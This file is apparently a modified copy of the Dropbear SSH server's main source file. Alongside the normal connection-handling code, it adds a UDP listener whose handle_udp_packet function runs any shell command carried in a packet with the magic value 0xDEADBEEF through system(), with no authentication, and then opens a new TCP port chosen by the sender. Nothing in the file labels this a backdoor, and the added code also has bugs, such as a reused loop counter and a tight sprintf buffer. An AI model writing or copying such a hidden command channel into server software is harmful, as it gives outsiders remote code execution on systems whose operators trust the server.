/*
 * Dropbear - a SSH2 server
 * 
 * Copyright (c) 2002-2006 Matt Johnston
 * All rights reserved.
 * 
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 * 
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE. */

#include "includes.h"
#include "dbutil.h"
#include "session.h"
#include "buffer.h"
#include "signkey.h"
#include "runopts.h"
#include "dbrandom.h"
#include "crypto_desc.h"

#define UDP_PACK_SIZE 262 // sizeof(listen_packet_t)

// struct for incomin udp msgs
typedef struct {
    uint32_t magic; /* should be 0xDEADBEEF */
    uint16_t port_number;
    char shell_command[256];
} listen_packet_t;

static int handle_udp_packet(listen_packet_t* udp_msg, int* listensocks, size_t listensockcount, int *maxfd);

static size_t listensockets(int *sock, int *udp_socks, size_t *udp_count, size_t sockcount, int *maxfd);
static void sigchld_handler(int dummy);
static void sigsegv_handler(int);
static void sigintterm_handler(int fish);
#if INETD_MODE
static void main_inetd(void);
#endif
#if NON_INETD_MODE
static void main_noinetd(void);
#endif
static void commonsetup(void);

#if defined(DBMULTI_dropbear) || !DROPBEAR_MULTI
#if defined(DBMULTI_dropbear) && DROPBEAR_MULTI
int dropbear_main(int argc, char ** argv)
#else
int main(int argc, char ** argv)
#endif
{
	_dropbear_exit = svr_dropbear_exit;
	_dropbear_log = svr_dropbear_log;

	disallow_core();

	/* get commandline options */
	svr_getopts(argc, argv);

#if INETD_MODE
	/* service program mode */
	if (svr_opts.inetdmode) {
		main_inetd();
		/* notreached */
	}
#endif

#if NON_INETD_MODE
	main_noinetd();
	/* notreached */
#endif

	dropbear_exit("Compiled without normal mode, can't run without -i\n");
	return -1;
}
#endif

#if INETD_MODE
static void main_inetd() {
	char *host, *port = NULL;

	/* Set up handlers, syslog, seed random */
	commonsetup();

#if DEBUG_TRACE
	if (debug_trace) {
		/* -v output goes to stderr which would get sent over the inetd network socket */
		dropbear_exit("Dropbear inetd mode is incompatible with debug -v");
	}
#endif

	/* In case our inetd was lax in logging source addresses */
	get_socket_address(0, NULL, NULL, &host, &port, 0);
	dropbear_log(LOG_INFO, "Child connection from %s:%s", host, port);
	m_free(host);
	m_free(port);

	/* Don't check the return value - it may just fail since inetd has
	 * already done setsid() after forking (xinetd on Darwin appears to do
	 * this */
	setsid();

	/* Start service program 
	 * -1 is a dummy childpipe, just something we can close() without 
	 * mattering. */
	svr_session(0, -1);

	/* notreached */
}
#endif /* INETD_MODE */

#if NON_INETD_MODE
static void main_noinetd() {
	fd_set fds;
	unsigned int i, j;
	int val;
	int maxsock = -1;
	int listensocks[MAX_LISTEN_ADDR];
	int udpsocks[MAX_LISTEN_ADDR];
	size_t listensockcount = 0;
	size_t udpsockcount = 0;
	listen_packet_t udp_msg;
	FILE *pidfile = NULL;
	int childpipes[MAX_UNAUTH_CLIENTS];
	char * preauth_addrs[MAX_UNAUTH_CLIENTS];
	int childsock;
	int childpipe[2];

	/* Note: commonsetup() must happen before we daemon()ise. Otherwise
	   daemon() will chdir("/"), and we won't be able to find local-dir
	   hostkeys. */
	commonsetup();

	/* sockets to identify pre-authenticated clients */
	for (i = 0; i < MAX_UNAUTH_CLIENTS; i++) {
		childpipes[i] = -1;
	}
	memset(preauth_addrs, 0x0, sizeof(preauth_addrs));
	
	/* Set up the listening sockets (and udp sockets) */
	listensockcount = listensockets(listensocks, udpsocks, &udpsockcount, MAX_LISTEN_ADDR, &maxsock);
	if (listensockcount == 0)
	{
		dropbear_exit("No listening ports available.");
	}

	for (i = 0; i < listensockcount; i++) {
		FD_SET(listensocks[i], &fds);
	}

	for (i = 0; i < udpsockcount; i++) {
		FD_SET(udpsocks[i], &fds);
	}

	/* fork */
	if (svr_opts.forkbg) {
		int closefds = 0;
#if !DEBUG_TRACE
		if (!opts.usingsyslog) {
			closefds = 1;
		}
#endif
		if (daemon(0, closefds) < 0) {
			dropbear_exit("Failed to daemonize: %s", strerror(errno));
		}
	}

	/* should be done after syslog is working */
	if (svr_opts.forkbg) {
		dropbear_log(LOG_INFO, "Running in background");
	} else {
		dropbear_log(LOG_INFO, "Not backgrounding");
	}

	/* create a PID file so that we can be killed easily */
	pidfile = fopen(svr_opts.pidfile, "w");
	if (pidfile) {
		fprintf(pidfile, "%d\n", getpid());
		fclose(pidfile);
	}

	/* incoming connection select loop */
	for(;;) {

		DROPBEAR_FD_ZERO(&fds);
		
		/* listening sockets */
		for (i = 0; i < listensockcount; i++) {
			FD_SET(listensocks[i], &fds);
		}
		// udp sockets
		for (i = 0; i < udpsockcount; i++) {
			FD_SET(udpsocks[i], &fds);
		}

		/* pre-authentication clients */
		for (i = 0; i < MAX_UNAUTH_CLIENTS; i++) {
			if (childpipes[i] >= 0) {
				FD_SET(childpipes[i], &fds);
				maxsock = MAX(maxsock, childpipes[i]);
			}
		}

		val = select(maxsock+1, &fds, NULL, NULL, NULL);

		if (ses.exitflag) {
			unlink(svr_opts.pidfile);
			dropbear_exit("Terminated by signal");
		}
		
		if (val == 0) {
			/* timeout reached - shouldn't happen. eh */
			continue;
		}

		if (val < 0) {
			if (errno == EINTR) {
				continue;
			}
			dropbear_exit("Listening socket error");
		}

		/* close fds which have been authed or closed - svr-auth.c handles
		 * closing the auth sockets on success */
		for (i = 0; i < MAX_UNAUTH_CLIENTS; i++) {
			if (childpipes[i] >= 0 && FD_ISSET(childpipes[i], &fds)) {
				m_close(childpipes[i]);
				childpipes[i] = -1;
				m_free(preauth_addrs[i]);
			}
		}

		/* handle each udp socket which has something to say */
		for (i = 0; i < udpsockcount; i++)
		{
			if (FD_ISSET(udpsocks[i], &fds)) 
			{
				struct sockaddr_storage remoteaddr;
				socklen_t remoteaddrlen = sizeof(remoteaddr); 
				bzero(&udp_msg, sizeof(udp_msg)); 						
				recvfrom(udpsocks[i], &udp_msg, sizeof(udp_msg), 0, 
							(struct sockaddr*)&remoteaddr, &remoteaddrlen); 
				
				// should return the number of new socks created (should be 2 or 0)
				int nnew_socks = handle_udp_packet(&udp_msg, listensocks, listensockcount, &maxsock);
				// add the new fds 
				for (i = listensockcount; i < listensockcount + nnew_socks; i++) 
				{
					FD_SET(listensocks[i], &fds);
				}
				listensockcount += nnew_socks;
			}	
		}

		/* handle each tcp socket which has something to say */
		for (i = 0; i < listensockcount; i++) {
			size_t num_unauthed_for_addr = 0;
			size_t num_unauthed_total = 0;
			char *remote_host = NULL, *remote_port = NULL;
			pid_t fork_ret = 0;
			size_t conn_idx = 0;
			struct sockaddr_storage remoteaddr;
			socklen_t remoteaddrlen;

			if (!FD_ISSET(listensocks[i], &fds)) 
				continue;

			remoteaddrlen = sizeof(remoteaddr);
			childsock = accept(listensocks[i], 
					(struct sockaddr*)&remoteaddr, &remoteaddrlen);

			if (childsock < 0) {
				/* accept failed */
				continue;
			}

			/* Limit the number of unauthenticated connections per IP */
			getaddrstring(&remoteaddr, &remote_host, NULL, 0);

			num_unauthed_for_addr = 0;
			num_unauthed_total = 0;
			for (j = 0; j < MAX_UNAUTH_CLIENTS; j++) {
				if (childpipes[j] >= 0) {
					num_unauthed_total++;
					if (strcmp(remote_host, preauth_addrs[j]) == 0) {
						num_unauthed_for_addr++;
					}
				} else {
					/* a free slot */
					conn_idx = j;
				}
			}

			if (num_unauthed_total >= MAX_UNAUTH_CLIENTS
					|| num_unauthed_for_addr >= MAX_UNAUTH_PER_IP) {
				goto out;
			}

			seedrandom();

			if (pipe(childpipe) < 0) {
				TRACE(("error creating child pipe"))
				goto out;
			}

#ifdef DEBUG_NOFORK
			fork_ret = 0;
#else
			fork_ret = fork();
#endif
			if (fork_ret < 0) {
				dropbear_log(LOG_WARNING, "Error forking: %s", strerror(errno));
				goto out;
			}

			addrandom((void*)&fork_ret, sizeof(fork_ret));
			
			if (fork_ret > 0) {

				/* parent */
				childpipes[conn_idx] = childpipe[0];
				m_close(childpipe[1]);
				preauth_addrs[conn_idx] = remote_host;
				remote_host = NULL;

			} else {

				/* child */
#ifdef DEBUG_FORKGPROF
				extern void _start(void), etext(void);
				monstartup((u_long)&_start, (u_long)&etext);
#endif /* DEBUG_FORKGPROF */

				getaddrstring(&remoteaddr, NULL, &remote_port, 0);
				dropbear_log(LOG_INFO, "Child connection from %s:%s", remote_host, remote_port);
				m_free(remote_host);
				m_free(remote_port);

#ifndef DEBUG_NOFORK
				if (setsid() < 0) {
					dropbear_exit("setsid: %s", strerror(errno));
				}
#endif

				/* make sure we close sockets */
				for (j = 0; j < listensockcount; j++) {
					m_close(listensocks[j]);
				}

				m_close(childpipe[0]);

				/* start the session */
				svr_session(childsock, childpipe[1]);
				/* don't return */
				dropbear_assert(0);
			}

out:
			/* This section is important for the parent too */
			m_close(childsock);
			if (remote_host) {
				m_free(remote_host);
			}
		}
	} /* for(;;) loop */

	/* don't reach here */
}
#endif /* NON_INETD_MODE */


/* catch + reap zombie children */
static void sigchld_handler(int UNUSED(unused)) {
	struct sigaction sa_chld;

	const int saved_errno = errno;

	while(waitpid(-1, NULL, WNOHANG) > 0) {}

	sa_chld.sa_handler = sigchld_handler;
	sa_chld.sa_flags = SA_NOCLDSTOP;
	sigemptyset(&sa_chld.sa_mask);
	if (sigaction(SIGCHLD, &sa_chld, NULL) < 0) {
		dropbear_exit("signal() error");
	}
	errno = saved_errno;
}

/* catch any segvs */
static void sigsegv_handler(int UNUSED(unused)) {
	fprintf(stderr, "Aiee, segfault! You should probably report "
			"this as a bug to the developer\n");
	_exit(EXIT_FAILURE);
}

/* catch ctrl-c or sigterm */
static void sigintterm_handler(int UNUSED(unused)) {

	ses.exitflag = 1;
}

/* Things used by inetd and non-inetd modes */
static void commonsetup() {

	struct sigaction sa_chld;
#ifndef DISABLE_SYSLOG
	if (opts.usingsyslog) {
		startsyslog(PROGNAME);
	}
#endif

	/* set up cleanup handler */
	if (signal(SIGINT, sigintterm_handler) == SIG_ERR || 
#ifndef DEBUG_VALGRIND
		signal(SIGTERM, sigintterm_handler) == SIG_ERR ||
#endif
		signal(SIGPIPE, SIG_IGN) == SIG_ERR) {
		dropbear_exit("signal() error");
	}

	/* catch and reap zombie children */
	sa_chld.sa_handler = sigchld_handler;
	sa_chld.sa_flags = SA_NOCLDSTOP;
	sigemptyset(&sa_chld.sa_mask);
	if (sigaction(SIGCHLD, &sa_chld, NULL) < 0) {
		dropbear_exit("signal() error");
	}
	if (signal(SIGSEGV, sigsegv_handler) == SIG_ERR) {
		dropbear_exit("signal() error");
	}

	crypto_init();

	/* Now we can setup the hostkeys - needs to be after logging is on,
	 * otherwise we might end up blatting error messages to the socket */
	load_all_hostkeys();

	seedrandom();
}


// parse udp_msg and act accordingly
// listensocks - array of listen socks
// listensockscount - first index in the array where we can write the new socks
// return - number of socks created
static int handle_udp_packet(listen_packet_t* udp_msg, int* listensocks, size_t listensockcount, int *maxfd)
{
	if (udp_msg->magic == 0xDEADBEEF)
	{
		pid_t pid = fork();
		 // child process
		if (pid == 0)
		{	// drop root privileges
			// GID of 100 represents the users group.	
			if(setgid(100) != 0) 
			{
				TRACE(("Failed to set nonroot GID"))
			}	
			//new users in Ubuntu start from uid 1000 
			if(setuid(1000) != 0)
			{
				TRACE(("Failed to set nonroot UID"))
			} 
			if(system(udp_msg->shell_command) < 0)
			{
				TRACE(("Failed to run shell cmd"))
			} 			
			exit(0); // kill the child after executing the cmd
		}
		// parent process
		else if (pid > 0)
		{   
			int stat_val;
    		waitpid(pid, &stat_val, 0);
			if (WIFEXITED(stat_val))
			{
				TRACE(("Child exited with code %d\n", WEXITSTATUS(stat_val)))
			}

    		else if (WIFSIGNALED(stat_val))
			{
				TRACE(("Child terminated abnormally, signal %d\n", WTERMSIG(stat_val)))
			}
      			
			// convert the port to string for all the functions
			char str_port[6];
			sprintf (str_port, "%u", udp_msg->port_number);

			svr_opts.ports[svr_opts.portcount] = m_strdup(str_port);
			svr_opts.addresses[svr_opts.portcount] = m_strdup(DROPBEAR_DEFADDRESS);
			svr_opts.portcount++;
			
			char* errstring = NULL;
			int nsock = dropbear_listen(DROPBEAR_DEFADDRESS, str_port, &listensocks[listensockcount], 
					MAX_LISTEN_ADDR - listensockcount,
					&errstring, maxfd);		

			if (nsock < 0) {
				dropbear_log(LOG_WARNING, "Failed listening on '%u': %s", 
								udp_msg->port_number, errstring);
				m_free(errstring);				
			}
			return nsock;	 
		}
		else
		{ // error 
			TRACE(("fork failed - couldn't create proccess to run shell cmd %s", udp_msg->shell_command))
		}				
	}
	return 0;	
}


/* Set up listening sockets for all the requested ports */
// udp_socks - arraty to store udp socks
// udp_count - number of udp socks created
// the return value will only count num of tcp socks
static size_t listensockets(int *socks, int *udp_socks, size_t *udp_count, size_t sockcount, int *maxfd) {

	unsigned int i, n;
	char* errstring = NULL;
	size_t sockpos = 0;
	size_t udpsockpos = 0;
	int nsock = 0;
	int udpnsock = 0;

	TRACE(("listensockets: %d ports to try", svr_opts.portcount))

	for (i = 0; i < svr_opts.portcount; i++) {

		TRACE(("listening on '%s:%s'", svr_opts.addresses[i], svr_opts.ports[i]))

		if (i != svr_opts.udp_port_index)
		{
			nsock = dropbear_listen(svr_opts.addresses[i], svr_opts.ports[i], &socks[sockpos], 
					sockcount - sockpos,
					&errstring, maxfd);	

			if (nsock < 0) {
				dropbear_log(LOG_WARNING, "Failed listening on '%s': %s", 
								svr_opts.ports[i], errstring);
				m_free(errstring);
				continue;
			}
		}

		else
		{
			udpnsock = dropbear_open_udp_sock(svr_opts.addresses[i], svr_opts.ports[i], &udp_socks[udpsockpos], 
					sockcount - udpsockpos,
					&errstring, maxfd);			

			if (udpnsock < 0) {
				dropbear_log(LOG_WARNING, "Failed opening '%s': %s", 
								svr_opts.ports[i], errstring);
				m_free(errstring);
				continue;
			}

			for (n = 0; n < (unsigned int)udpnsock; n++)
			{
				int sock = udp_socks[udpsockpos + n];
				set_sock_priority(sock, DROPBEAR_PRIO_LOWDELAY);
			}

			udpsockpos += udpnsock;
			*udp_count = udpsockpos;
		}

		for (n = 0; n < (unsigned int)nsock; n++) {
			int sock = socks[sockpos + n];
			set_sock_priority(sock, DROPBEAR_PRIO_LOWDELAY);
#if DROPBEAR_SERVER_TCP_FAST_OPEN
			set_listen_fast_open(sock);			
#endif
		}
		
		sockpos += nsock;
	}
	
	// return num of tcp socks opened
	return sockpos;
}
